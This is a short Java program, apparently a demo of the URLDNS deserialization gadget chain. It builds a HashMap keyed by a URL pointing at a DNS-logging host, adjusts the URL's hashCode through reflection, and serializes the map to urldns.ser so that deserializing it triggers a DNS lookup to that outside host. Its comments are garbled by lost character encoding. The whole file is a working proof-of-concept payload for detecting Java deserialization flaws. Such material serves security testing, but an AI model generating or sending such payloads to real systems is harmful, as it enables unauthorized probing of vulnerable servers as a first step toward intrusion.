import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class UrlDemo {
    public static void main(String[] args) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL("http://94d548ae.dns.1433.eu.org");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true); // �ƹ�Java����Ȩ�޿��Ƽ���Ȩ��
        f.set(url,123); //����hashCode��ֵ��Ϊ-1���޷�����DNS��ѯ
        map.put(url,"Tom");
        f.set(url,-1); //��֤�����л�ʱ���Խ���DNS��ѯ

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);

            outputStream.writeObject(map);
            outputStream.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
            inputStream.readObject();
            inputStream.close();
            fileInputStream.close();
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }
}